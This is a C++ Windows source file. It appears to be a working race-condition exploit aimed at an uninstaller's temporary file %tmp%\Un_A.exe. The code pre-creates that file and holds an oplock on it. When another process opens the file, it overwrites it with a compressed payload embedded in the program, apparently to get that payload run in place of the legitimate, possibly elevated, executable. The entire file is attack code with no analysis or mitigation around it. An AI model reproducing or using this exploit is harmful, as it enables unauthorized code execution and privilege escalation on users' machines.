#include "stdafx.h"

HRESULT Unzip(_In_ LPCVOID CompressedData,
	_In_ ULONG CompressedDataSize,
	_Out_ PVOID* pUncompressedBuffer,
	_Out_ ULONG* pUncompressedDataSize);

_NT_BEGIN

HRESULT GetLastErrorEx(ULONG dwError = GetLastError())
{
	NTSTATUS status = RtlGetLastNtStatus();
	return RtlNtStatusToDosErrorNoTeb(status) == dwError ? HRESULT_FROM_NT(status) : HRESULT_FROM_WIN32(dwError);
}

template <typename T>
T HR(HRESULT& hr, T t)
{
	hr = t ? NOERROR : GetLastErrorEx();
	return t;
}

HMODULE GetNtMod()
{
	static HMODULE s_hntmod;
	if (!s_hntmod)
	{
		s_hntmod = GetModuleHandle(L"ntdll");
	}

	return s_hntmod;
}

int ShowErrorBox(HWND hwnd, HRESULT dwError, PCWSTR lpCaption)
{
	int r = 0;
	LPCVOID lpSource = 0;
	ULONG dwFlags = FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS;

	if ((dwError & FACILITY_NT_BIT) || (0 > dwError && HRESULT_FACILITY(dwError) == FACILITY_NULL))
	{
		dwError &= ~FACILITY_NT_BIT;
	__nt:
		dwFlags = FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS;

		lpSource = GetModuleHandle(L"ntdll");
	}

	PWSTR lpText;
	if (FormatMessageW(dwFlags, lpSource, dwError, 0, (PWSTR)&lpText, 0, 0))
	{
		r = MessageBoxW(hwnd, lpText, lpCaption, dwError ? MB_ICONERROR : MB_ICONINFORMATION);
		LocalFree(lpText);
	}
	else if (dwFlags & FORMAT_MESSAGE_FROM_SYSTEM)
	{
		goto __nt;
	}

	return r;
}

extern const CHAR f1_begin[], f1_end[];

VOID NTAPI OnApc(
	_In_ PVOID ApcContext,
	_In_ PIO_STATUS_BLOCK /*IoStatusBlock*/,
	_In_ ULONG
)
{
	*(BOOL*)ApcContext = TRUE;
}

NTSTATUS WaitIoComplete(NTSTATUS status, PBOOL pb, PIO_STATUS_BLOCK piosb)
{
	if (STATUS_PENDING == status)
	{
		while (!*pb)
		{
			SleepEx(INFINITE, TRUE);
		}

		return piosb->Status;
	}

	return status;
}

NTSTATUS t24(PCWSTR fileName, PVOID pv, ULONG cb)
{
	HANDLE hFile;
	IO_STATUS_BLOCK iosb;
	UNICODE_STRING ObjectName;
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName };
	RtlInitUnicodeString(&ObjectName, fileName);
	NTSTATUS status;

	ACCESS_MASK DesiredAccess;
	ULONG CreateDisposition, CreateOptions;

	if (pv)
	{
		DesiredAccess = FILE_GENERIC_WRITE | FILE_GENERIC_READ;
		CreateDisposition = FILE_OVERWRITE_IF;
		CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT;
	}
	else
	{
		DesiredAccess = FILE_READ_ATTRIBUTES;
		CreateDisposition = FILE_OPEN_IF;
		CreateOptions = FILE_NON_DIRECTORY_FILE;
	}

__loop:
	switch (status = NtCreateFile(&hFile, DesiredAccess, &oa, &iosb, 0, 0,
		FILE_SHARE_VALID_FLAGS, CreateDisposition, CreateOptions, 0, 0))
	{
	case STATUS_SHARING_VIOLATION:
		goto __loop;

	case STATUS_SUCCESS:

		if (pv)
		{
			LARGE_INTEGER ByteOffset = { };
			status = NtWriteFile(hFile, 0, 0, 0, &iosb, pv, cb, &ByteOffset, 0);
		}
		else
		{
			BOOL b;
			while (STATUS_OPLOCK_NOT_GRANTED == (status = WaitIoComplete(NtFsControlFile(hFile, 0,
				OnApc, &(b = FALSE), &iosb, FSCTL_REQUEST_OPLOCK_LEVEL_1, 0, 0, 0, 0), &b, &iosb)))
			{
			}
		}
		NtClose(hFile);
		break;

	default:
		__nop();
	}

	return status;
}

void WINAPI ep(void*)
{
	ULONG cch = 0;
	PWSTR psz = 0;
	while (cch = ExpandEnvironmentStringsW(L"\\??\\%tmp%\\Un_A.exe", psz, cch))
	{
		if (psz)
		{
			PVOID pv;
			ULONG cb;
			if (NOERROR == Unzip(f1_begin, RtlPointerToOffset(f1_begin, f1_end), &pv, &cb))
			{
				if (0 <= t24(psz, 0, 0))
				{
					t24(psz, pv, cb);
				}
				LocalFree(pv);
			}

			break;
		}

		psz = (PWSTR)alloca(cch * sizeof(WCHAR));
	}

	ExitProcess(0);
}

_NT_END